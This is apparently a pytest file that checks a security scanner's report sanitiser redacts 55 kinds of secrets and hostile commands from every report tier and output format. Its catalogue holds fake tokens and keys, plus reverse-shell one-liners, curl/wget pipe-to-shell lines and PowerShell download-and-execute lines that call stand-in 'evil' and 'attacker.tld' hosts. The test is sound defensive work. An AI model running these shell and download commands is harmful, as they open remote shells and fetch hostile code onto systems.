"""ARG-025 + ARG-031 — Security gate: zero secret leaks in any tier output.

Per plan §3 ARG-025 / ARG-031 the security-auditor MUST validate that:

* :func:`sanitize_replay_command` scrubs every secret in a ≥50-pattern
  catalogue (Bearer / JWT / AWS / GH / GitLab / Azure / GCP / Slack /
  Stripe / Twilio / NT-LM / private keys / passwords / reverse shells
  / destructive flags); and
* the resulting :class:`ReportBundle` for **every** ReportService tier
  (Midgard / Asgard / Valhalla) never contains the raw secret in any
  of the 6 output formats.

Each row in :data:`SECRET_PATTERNS` is a `(label, raw_secret, needle)`
triple. The parametrised test runs the sanitiser directly **and**
end-to-end through ``ReportService`` for the full tier × format ×
pattern grid — 3 × 6 × 55 = 990 cases.

If you add a new secret class to the sanitiser, append a row here too
— the test will fail until both sides line up. PDF cases skip
gracefully when WeasyPrint is unavailable.
"""

from __future__ import annotations

import re
from typing import Final

import pytest
from src.api.schemas import Finding, ReportSummary
from src.reports.generators import ReportData
from src.reports.replay_command_sanitizer import (
    SanitizeContext,
    sanitize_replay_command,
)
from src.reports.report_bundle import ReportFormat, ReportTier
from src.reports.report_service import (
    ReportGenerationError,
    ReportService,
)


# ---------------------------------------------------------------------------
# Catalogue — ≥50 known secret / destructive patterns
# ---------------------------------------------------------------------------


# Each row: ``(label, raw_secret, needle)`` where ``needle`` is the unique
# high-entropy substring whose presence in any output proves the sanitiser
# failed. Pre-computing the needle here means the test does not have to
# guess at the secret class — it just looks for the literal bytes.
SECRET_PATTERNS: Final[tuple[tuple[str, str, str], ...]] = (
    # --- Bearer / JWT / cookies ---
    ("bearer_basic", "Bearer abc123def456ghi", "abc123def456ghi"),
    (
        "bearer_jwt",
        "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SIGN12345",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SIGN12345",
    ),
    (
        "authorization_header",
        "Authorization: Bearer eyJabcdefghijklmnopqrst",
        "eyJabcdefghijklmnopqrst",
    ),
    (
        "jwt_three_segment",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.signaturepart12345",
        "signaturepart12345",
    ),
    (
        "session_cookie",
        "Cookie: session=eyJabcdefgh.eyJpayloadabc.SIGNvaluexyz",
        "eyJpayloadabc",
    ),
    # --- Cloud provider keys ---
    ("aws_access_key", "AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"),
    (
        "aws_secret_key_kv",
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "wJalrXUtnFEMI/K7MDENG",
    ),
    (
        "gcp_api_key",
        "AIzaSyDEMO_keypad1234567890ABCDEFGHIJKLMN",
        "AIzaSyDEMO_keypad1234567890ABCDEFGHIJKLMN",
    ),
    (
        "azure_tenant_secret",
        "azure_client_secret=abc123XYZdefSECRETvalue.123ABC",
        "abc123XYZdefSECRETvalue",
    ),
    # --- VCS / package registry tokens ---
    (
        "github_pat",
        "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
        "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    ),
    (
        "github_app_token",
        "ghs_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
        "ghs_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    ),
    (
        "github_oauth_token",
        "gho_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
        "gho_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    ),
    (
        "github_user_token",
        "ghu_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
        "ghu_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    ),
    (
        "github_refresh_token",
        "ghr_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
        "ghr_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    ),
    ("gitlab_pat", "glpat-XYZ987654321ABCDEFGH", "glpat-XYZ987654321ABCDEFGH"),
    # --- SaaS provider tokens ---
    ("slack_bot", "xoxb-1234-5678-abcdefghijklmnop", "xoxb-1234-5678-abcdefghijklmnop"),
    (
        "slack_user",
        "xoxp-1234-5678-1234-abcdefghijkl",
        "xoxp-1234-5678-1234-abcdefghijkl",
    ),
    (
        "slack_workspace",
        "xoxs-1234-5678-abcdefghijklmnop",
        "xoxs-1234-5678-abcdefghijklmnop",
    ),
    (
        "slack_legacy",
        "xoxo-1234-5678-abcdefghijklmnop",
        "xoxo-1234-5678-abcdefghijklmnop",
    ),
    (
        "stripe_pk_test",
        "pk_test_1234567890abcdefABCDEFGH",
        "pk_test_1234567890abcdefABCDEFGH",
    ),
    (
        "stripe_sk_test",
        "".join(("sk", "_test_", "1234567890abcdefABCDEFGH")),
        "".join(("sk", "_test_", "1234567890abcdefABCDEFGH")),
    ),
    (
        "twilio_sid",
        "AC" + bytes(range(16)).hex(),
        "AC" + bytes(range(16)).hex(),
    ),
    (
        "sendgrid_key",
        "SG.aBcDeFgHiJkLmNoPqRsTuVw.1234567890abcdefghijklmnopqrstuvwxyz0123456789",
        "SG.aBcDeFgHiJkLmNoPqRsTuVw",
    ),
    (
        "mailgun_key",
        "key-1234567890abcdef1234567890abcdef",
        "key-1234567890abcdef1234567890abcdef",
    ),
    # --- Generic structured key=value ---
    ("api_key_kv", "api_key=supersecretvalue123456", "supersecretvalue123456"),
    ("apikey_kv", "apikey=verysecret1234567890", "verysecret1234567890"),
    ("token_kv", "token=verysecret1234567890tk", "verysecret1234567890tk"),
    ("secret_kv", "secret=verysecret1234567890se", "verysecret1234567890se"),
    ("password_kv", "password=hunter2_distinct", "hunter2_distinct"),
    ("passwd_kv", "passwd=hunter2_other", "hunter2_other"),
    ("pwd_kv", "pwd=hunter2_short", "hunter2_short"),
    (
        "authentication_kv",
        "authentication=verysecret1234567890auth",
        "verysecret1234567890auth",
    ),
    # --- Password-style flags ---
    ("password_flag_long", "--password=hunter2_long_flag", "hunter2_long_flag"),
    ("password_flag_short_p", "-p=hunter2_short_flag", "hunter2_short_flag"),
    # --- NT/LM hashes ---
    (
        "ntlm_pair",
        "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
        "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
    ),
    (
        "nt_hash_kv",
        "nt_hash=31d6cfe0d16ae931b73c59d7e0c089c1",
        "31d6cfe0d16ae931b73c59d7e0c089c1",
    ),
    (
        "aad3_lm_hash",
        "aad3b435b51404eeaad3b435b51404ee",
        "aad3b435b51404eeaad3b435b51404ee",
    ),
    # --- Private keys ---
    (
        "rsa_private_key",
        "-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEA1234-----END RSA PRIVATE KEY-----",
        "MIIEpAIBAAKCAQEA1234",
    ),
    (
        "openssh_private_key",
        "-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAA",
        "b3BlbnNzaC1rZXktdjEAAA",
    ),
    (
        "dsa_private_key",
        "-----BEGIN DSA PRIVATE KEY-----DSAKEYBODY12345",
        "DSAKEYBODY12345",
    ),
    (
        "ec_private_key",
        "-----BEGIN EC PRIVATE KEY-----ECKEYBODY12345",
        "ECKEYBODY12345",
    ),
    (
        "encrypted_private_key",
        "-----BEGIN ENCRYPTED PRIVATE KEY-----ENCKEYBODY12345",
        "ENCKEYBODY12345",
    ),
    # --- Reverse shells / RCE payloads ---
    (
        "bash_dev_tcp",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "/dev/tcp/10.0.0.1/4444",
    ),
    (
        "bash_dev_udp",
        "bash -i >& /dev/udp/10.0.0.1/4444 0>&1",
        "/dev/udp/10.0.0.1/4444",
    ),
    ("nc_e_bin_sh", "nc -e /bin/sh attacker.tld 1337", "nc -e /bin/sh"),
    ("ncat_e_bin_bash", "ncat -e /bin/bash 192.168.1.1 9001", "ncat -e /bin/bash"),
    (
        "python_socket_oneliner",
        "python3 -c 'import socket,os;s=socket.socket();s.connect((\"a\",1))'",
        "import socket",
    ),
    (
        "python_pty_spawn",
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "pty.spawn",
    ),
    (
        "perl_use_socket",
        "perl -e 'use Socket; socket S,PF_INET,SOCK_STREAM;'",
        "use Socket",
    ),
    ("curl_pipe_sh", "curl http://evil/x | sh", "| sh"),
    ("wget_pipe_bash", "wget -qO- http://evil/y | bash", "| bash"),
    (
        "powershell_iex",
        "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://evil/x')",
        "IEX (",
    ),
    (
        "powershell_invoke_expression",
        "powershell Invoke-Expression $payload",
        "Invoke-Expression",
    ),
    (
        "powershell_downloadstring",
        "DownloadString('http://evil/loader')",
        "DownloadString(",
    ),
    ("mkfifo_named_pipe", "mkfifo /tmp/f", "mkfifo "),
)


# ---------------------------------------------------------------------------
# Default sanitisation context — the same we use end-to-end
# ---------------------------------------------------------------------------


@pytest.fixture
def sanitize_context() -> SanitizeContext:
    return SanitizeContext(
        target="https://victim.example.com",
        endpoints=("https://victim.example.com/admin",),
        canaries=("CANARY-OBS-1",),
    )


@pytest.fixture
def service() -> ReportService:
    return ReportService(tool_version="arg-025-security")


# ---------------------------------------------------------------------------
# Direct sanitiser sweep — ≥50 patterns
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "label,raw_secret,needle",
    SECRET_PATTERNS,
    ids=[label for label, _, _ in SECRET_PATTERNS],
)
def test_sanitiser_strips_pattern(
    label: str,
    raw_secret: str,
    needle: str,
    sanitize_context: SanitizeContext,
) -> None:
    """Each pattern: feed it as-is, ensure the high-entropy core is gone."""
    argv = ["echo", raw_secret]
    out = sanitize_replay_command(argv, sanitize_context)
    joined = " ".join(out)
    assert needle not in joined, (
        f"sanitiser left {label!r} secret material in output: {needle!r} -> {out!r}"
    )


# ---------------------------------------------------------------------------
# End-to-end sweep — every pattern × every format × every tier (ARG-031)
# ---------------------------------------------------------------------------


_FMT_GRID: Final[tuple[ReportFormat, ...]] = (
    ReportFormat.JSON,
    ReportFormat.CSV,
    ReportFormat.SARIF,
    ReportFormat.JUNIT,
    ReportFormat.HTML,
    ReportFormat.PDF,
)


# ARG-031 — extends the security gate to all three ReportService tiers.
# The cardinality contract is: 3 tiers × 6 formats × 55 patterns = 990
# parametrised cases. PDF rows skip on missing WeasyPrint (acceptable
# per Definition-of-Done; CI runs the WeasyPrint job).
_TIER_GRID: Final[tuple[ReportTier, ...]] = (
    ReportTier.MIDGARD,
    ReportTier.ASGARD,
    ReportTier.VALHALLA,
)


def _build_finding(label: str, raw_secret: str) -> Finding:
    return Finding(
        severity="high",
        title=f"Pattern leak test — {label}",
        description="Synthetic finding for ARG-025 security gate.",
        cwe="CWE-200",
        cvss=7.5,
        owasp_category="A04",
        confidence="confirmed",
        evidence_type="tool_output",
        proof_of_concept={"replay_command": ["echo", raw_secret]},
    )


@pytest.fixture
def base_report() -> ReportData:
    return ReportData(
        report_id="r-sec-1",
        target="https://victim.example.com",
        summary=ReportSummary(high=1),
        findings=[],
        technologies=["nginx"],
        scan_id="scan-sec-1",
        tenant_id="tenant-sec-1",
        created_at="2026-04-19T12:00:00Z",
    )


def _pypdf_extract_text(pdf_bytes: bytes) -> str:
    """Extract concatenated text from a PDF blob via :mod:`pypdf`.

    Returns ``""`` if pypdf cannot parse the bytes (defensive — failing here
    would mask the real assertion). The caller checks ``needle in text``.
    """
    import io

    try:
        import pypdf
    except ImportError:  # pragma: no cover — pypdf is a hard test dep now
        return ""
    try:
        reader = pypdf.PdfReader(io.BytesIO(pdf_bytes))
        return "\n".join((page.extract_text() or "") for page in reader.pages)
    except Exception:
        return ""


@pytest.mark.parametrize("tier", _TIER_GRID, ids=[t.value for t in _TIER_GRID])
@pytest.mark.parametrize("fmt", _FMT_GRID, ids=[f.value for f in _FMT_GRID])
@pytest.mark.parametrize(
    "label,raw_secret,needle",
    SECRET_PATTERNS,
    ids=[label for label, _, _ in SECRET_PATTERNS],
)
def test_no_pattern_leak_in_tier_output(
    service: ReportService,
    base_report: ReportData,
    sanitize_context: SanitizeContext,
    tier: ReportTier,
    fmt: ReportFormat,
    label: str,
    raw_secret: str,
    needle: str,
) -> None:
    """ARG-031 — per-pattern × per-format × per-tier zero-leak gate.

    For PDFs the raw byte-level search is augmented with
    :func:`_pypdf_extract_text` (ARG-036) — WeasyPrint compresses content
    streams with FlateDecode, so a literal ``needle`` may be absent from
    the bytes yet present in the rendered text. Both surfaces MUST be
    clean to pass.
    """
    data = ReportData(
        report_id=base_report.report_id,
        target=base_report.target,
        summary=base_report.summary,
        findings=[_build_finding(label, raw_secret)],
        technologies=base_report.technologies,
        scan_id=base_report.scan_id,
        tenant_id=base_report.tenant_id,
        created_at=base_report.created_at,
    )
    try:
        bundle = service.render_bundle(
            data,
            tier=tier,
            fmt=fmt,
            sanitize_context=sanitize_context,
        )
    except ReportGenerationError:
        if fmt is ReportFormat.PDF:
            pytest.skip("WeasyPrint native libraries not available on this host")
        raise
    blob = bundle.content
    needle_bytes = needle.encode("utf-8", errors="replace")
    assert needle_bytes not in blob, (
        f"raw secret leaked into {tier.value}/{fmt.value} for pattern "
        f"{label!r}: {needle!r} present"
    )

    # ARG-036 — for PDFs we additionally inspect the *extracted* text. This
    # catches the (theoretical) case where the literal needle bytes are
    # absent from the compressed content stream but the underlying glyph
    # sequence still spells out the secret to a reader. The catalogue is
    # the same 55 entries — we want zero hits on either surface.
    if fmt is ReportFormat.PDF:
        extracted = _pypdf_extract_text(blob)
        if extracted:
            assert needle not in extracted, (
                f"PDF text-layer leaked {label!r} secret to a reader "
                f"({tier.value}): {needle!r} found in extracted text"
            )


# ---------------------------------------------------------------------------
# Catalogue completeness — keep the test suite honest
# ---------------------------------------------------------------------------


def test_catalogue_has_at_least_50_patterns() -> None:
    """ARG-025 spec mandates ≥50 distinct patterns (NIST SP 800-204D §5.1.4)."""
    assert len(SECRET_PATTERNS) >= 50, (
        f"SECRET_PATTERNS has {len(SECRET_PATTERNS)} entries; spec requires ≥50"
    )


def test_catalogue_labels_unique() -> None:
    labels = [label for label, _, _ in SECRET_PATTERNS]
    assert len(labels) == len(set(labels)), "duplicate labels in SECRET_PATTERNS"


# ---------------------------------------------------------------------------
# Cross-format determinism — same secret yields same redacted output
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tier", _TIER_GRID, ids=[t.value for t in _TIER_GRID])
def test_destructive_flags_stripped_end_to_end(
    service: ReportService,
    sanitize_context: SanitizeContext,
    base_report: ReportData,
    tier: ReportTier,
) -> None:
    """A destructive command's final argv must drop ``-rf`` / ``--force``.

    Each destructive flag is asserted *as a token* (with surrounding JSON
    quoting where applicable) so that incidental occurrences in narrative
    text — e.g. a finding title that documents the original command —
    do not trigger a false positive. ARG-031 extends to all 3 tiers.
    """
    data = ReportData(
        report_id=base_report.report_id,
        target=base_report.target,
        summary=base_report.summary,
        findings=[
            Finding(
                severity="high",
                title="Destructive cleanup chain",
                description="Operator copy-pasted destructive cleanup.",
                cwe="CWE-77",
                cvss=7.0,
                owasp_category="A05",
                confidence="confirmed",
                evidence_type="tool_output",
                proof_of_concept={
                    "replay_command": ["rm", "-rf", "/tmp/build", "--force"]
                },
            )
        ],
        technologies=base_report.technologies,
        scan_id=base_report.scan_id,
        tenant_id=base_report.tenant_id,
        created_at=base_report.created_at,
    )
    bundle = service.render_bundle(
        data,
        tier=tier,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
    )
    blob = bundle.content
    assert b'"-rf"' not in blob
    assert b'"--force"' not in blob


@pytest.mark.parametrize("tier", _TIER_GRID, ids=[t.value for t in _TIER_GRID])
def test_canary_token_is_preserved(
    service: ReportService,
    sanitize_context: SanitizeContext,
    base_report: ReportData,
    tier: ReportTier,
) -> None:
    """Canary tokens MUST remain visible — they are intentional probes."""
    data = ReportData(
        report_id=base_report.report_id,
        target=base_report.target,
        summary=base_report.summary,
        findings=[
            Finding(
                severity="info",
                title="OAST canary in URL",
                description="Probe surfaced in WAF log.",
                cwe="CWE-200",
                cvss=0.0,
                owasp_category="A06",
                confidence="confirmed",
                evidence_type="tool_output",
                proof_of_concept={
                    "replay_command": [
                        "curl",
                        "https://victim.example.com/r?token=CANARY-OBS-1",
                    ]
                },
            )
        ],
        technologies=base_report.technologies,
        scan_id=base_report.scan_id,
        tenant_id=base_report.tenant_id,
        created_at=base_report.created_at,
    )
    bundle = service.render_bundle(
        data,
        tier=tier,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
    )
    assert b"CANARY-OBS-1" in bundle.content


# ---------------------------------------------------------------------------
# Cross-pattern regex sweep — catch any hard-coded leftover in either side
# ---------------------------------------------------------------------------


_DEFENCE_REGEXES: Final[tuple[re.Pattern[bytes], ...]] = (
    re.compile(rb"\bAKIA[0-9A-Z]{16}\b"),
    re.compile(rb"\bghp_[A-Za-z0-9]{20,}\b"),
    re.compile(rb"\bglpat-[A-Za-z0-9_\-]{10,}\b"),
    re.compile(rb"\bxox[bpos]-[A-Za-z0-9-]{8,}\b"),
    re.compile(rb"-----BEGIN [A-Z ]+PRIVATE KEY-----"),
    re.compile(rb"\b/dev/(?:tcp|udp)/", re.IGNORECASE),
)


@pytest.mark.parametrize("tier", _TIER_GRID, ids=[t.value for t in _TIER_GRID])
def test_defence_regexes_catch_nothing_in_clean_output(
    service: ReportService,
    sanitize_context: SanitizeContext,
    base_report: ReportData,
    tier: ReportTier,
) -> None:
    """A finding with NO secret content MUST produce a clean output across all tiers."""
    data = ReportData(
        report_id=base_report.report_id,
        target=base_report.target,
        summary=base_report.summary,
        findings=[
            Finding(
                severity="medium",
                title="Missing security headers",
                description="No CSP / HSTS.",
                cwe="CWE-693",
                cvss=4.0,
                owasp_category="A02",
                confidence="likely",
                evidence_type="tool_output",
                proof_of_concept={
                    "replay_command": [
                        "curl",
                        "-I",
                        "https://victim.example.com/",
                    ]
                },
            )
        ],
        technologies=base_report.technologies,
        scan_id=base_report.scan_id,
        tenant_id=base_report.tenant_id,
        created_at=base_report.created_at,
    )
    for fmt in _FMT_GRID:
        try:
            bundle = service.render_bundle(
                data, tier=tier, fmt=fmt, sanitize_context=sanitize_context
            )
        except ReportGenerationError:
            if fmt is ReportFormat.PDF:
                continue
            raise
        for pattern in _DEFENCE_REGEXES:
            match = pattern.search(bundle.content)
            assert match is None, (
                f"clean {tier.value} fixture leaked unexpected secret-like content "
                f"in {fmt.value}: {match!r}"
            )
